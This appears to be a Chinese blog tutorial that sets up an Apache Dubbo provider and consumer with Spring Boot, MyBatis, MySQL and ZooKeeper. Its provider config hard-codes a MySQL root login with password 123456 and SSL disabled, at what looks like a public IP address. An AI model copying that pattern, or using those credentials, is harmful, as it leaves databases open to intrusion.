<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt;</span><br><span class="line">        &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;dubbo-provider&lt;/artifactId&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--dubbo 与 spring-boot 整合包--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!--springboot 启动核心包--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!--springboot rest --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-registry-zookeeper&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.3</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.3</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--mysql  的驱动--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;resources&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;src/main/java&lt;/directory&gt;</span><br><span class="line">                &lt;includes&gt;</span><br><span class="line">                    &lt;include&gt;**<span class="comment">/*.properties&lt;/include&gt;</span></span><br><span class="line"><span class="comment">                    &lt;include&gt;**/</span>*.xml&lt;/include&gt;</span><br><span class="line">                &lt;/includes&gt;</span><br><span class="line">                &lt;filtering&gt;<span class="literal">false</span>&lt;/filtering&gt;</span><br><span class="line">            &lt;/resource&gt;</span><br><span class="line">            &lt;resource&gt;</span><br><span class="line">                &lt;directory&gt;src/main/resources&lt;/directory&gt;</span><br><span class="line">                &lt;includes&gt;</span><br><span class="line">                    &lt;include&gt;**<span class="comment">/*.yml&lt;/include&gt;</span></span><br><span class="line"><span class="comment">                    &lt;include&gt;**/</span>*.xml&lt;/include&gt;</span><br><span class="line">                &lt;/includes&gt;</span><br><span class="line">                &lt;filtering&gt;<span class="literal">false</span>&lt;/filtering&gt;</span><br><span class="line">            &lt;/resource&gt;</span><br><span class="line">        &lt;/resources&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h2 id="第二步添加配置"><a class="markdownIt-Anchor" href="#第二步添加配置">#</a> 第二步：添加配置</h2>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">dubbo-samples-privider-springCloud</span></span><br><span class="line">    <span class="comment">#配置数据源信息</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="comment">#配置连接数据库的各个信息</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="comment">#设置字符集</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://8.142.127.37:3306/test?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;transformedBitIsBoolean=true&amp;serverTimezone=GMT%2B8&amp;nullCatalogMeansCurrent=true&amp;allowPublicKeyRetrieval=true</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="comment">#配置类型别名所对应的包</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.demo.provider.entity</span></span><br><span class="line">  <span class="comment">#配置SQL输出语句com.winsun.dataclean.mapper</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">com/demo/provider/mapper/*.xml</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">dubbo:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="attr">address:</span> <span class="string">zookeeper://43.139.86.193:2181</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="number">2000</span></span><br><span class="line">  <span class="attr">protocol:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">dubbo</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">20890</span></span><br><span class="line">  <span class="comment"># 扫描 @DubboService 注解</span></span><br><span class="line">  <span class="attr">scan:</span></span><br><span class="line">    <span class="attr">base-packages:</span> <span class="string">com.demo.provider.service.impl</span></span><br></pre></td></tr></table></figure>
<h2 id="第三步编写启动类"><a class="markdownIt-Anchor" href="#第三步编写启动类">#</a> 第三步：编写启动类</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.provider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.spring.context.annotation.EnableDubbo;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@EnableDubbo</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.demo.provider.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProviderApp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ProviderApp.class,args);</span><br><span class="line">        System.out.println(<span class="string">&quot;生产者启动完毕&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四步添加mapper接口"><a class="markdownIt-Anchor" href="#第四步添加mapper接口">#</a> 第四步：添加 mapper 接口</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.provider.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:01</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    User <span class="title function_">selectUserById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>xml:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.demo.provider.mapper.UserMapper&quot;</span>&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;selectUserById&quot;</span> resultType=<span class="string">&quot;com.demo.api.entity.User&quot;</span>&gt;</span><br><span class="line">        select * from user <span class="type">where</span> <span class="variable">id</span> <span class="operator">=</span> #&#123;id&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure>
<h2 id="第五步实现接口"><a class="markdownIt-Anchor" href="#第五步实现接口">#</a> 第五步：实现接口：</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.provider.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.demo.api.service.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.demo.provider.mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.DubboService;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:00</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@DubboService</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">IUserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">selectUserById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectUserById(id);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第六步编写controller层接口"><a class="markdownIt-Anchor" href="#第六步编写controller层接口">#</a> 第六步：编写<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=controller%E5%B1%82&amp;spm=1001.2101.3001.7020"> controller 层</a>接口</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">package</span> com.demo.provider.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.demo.api.service.IUserService;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:53</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/provider&quot;)</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IUserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/selectUserById/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">selectUserById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Long id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.selectUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="开发消费者模块"><a class="markdownIt-Anchor" href="#开发消费者模块">#</a> 开发消费者模块</h1>
<h2 id="第一步导入依赖-2"><a class="markdownIt-Anchor" href="#第一步导入依赖-2">#</a> 第一步：导入依赖</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt;</span><br><span class="line">        &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;dubbo-customer&lt;/artifactId&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!--dubbo-samples-springcloud-api 项目 依赖--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-registry-zookeeper&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h2 id="第二步添加配置-2"><a class="markdownIt-Anchor" href="#第二步添加配置-2">#</a> 第二步：添加配置</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: <span class="number">8082</span></span><br><span class="line"></span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: dubbo-samples-consumer-springCloud</span><br><span class="line"></span><br><span class="line">dubbo:</span><br><span class="line">  registry:</span><br><span class="line">    address: zookeeper:<span class="comment">//43.139.86.193:2181</span></span><br><span class="line">    timeout: <span class="number">2000</span></span><br><span class="line">  protocol:</span><br><span class="line">    name: dubbo</span><br></pre></td></tr></table></figure>
<h2 id="第三步编写启动类-2"><a class="markdownIt-Anchor" href="#第三步编写启动类-2">#</a> 第三步：编写启动类：</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.customer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.spring.context.annotation.EnableDubbo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDubbo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ConsumerApplication.class, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;消费者启动完毕!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四步编写调用生产者接口"><a class="markdownIt-Anchor" href="#第四步编写调用生产者接口">#</a> 第四步：编写调用生产者接口</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.customer.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.demo.api.service.IUserService;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.DubboReference;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/consumer&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerUserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DubboReference( protocol = &quot;dubbo&quot;, loadbalance = &quot;random&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> IUserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/selectUserById/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.selectUserById(id);</span><br><span class="line">        log.info(<span class="string">&quot;response from provider: &#123;&#125;&quot;</span>, user);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>整个项目结构如下：</strong></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/f302fc0e1073496084b5288ab609d158.jpeg" alt="在这里插入图片描述"></p>
<h1 id="测试"><a class="markdownIt-Anchor" href="#测试">#</a> 测试</h1>
<p>分别启动生产者和消费者，在浏览器分别调用以下接口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/provider/selectUserById/1`</span><br><span class="line">`http://localhost:8082/consumer/selectUserById/1</span><br></pre></td></tr></table></figure>
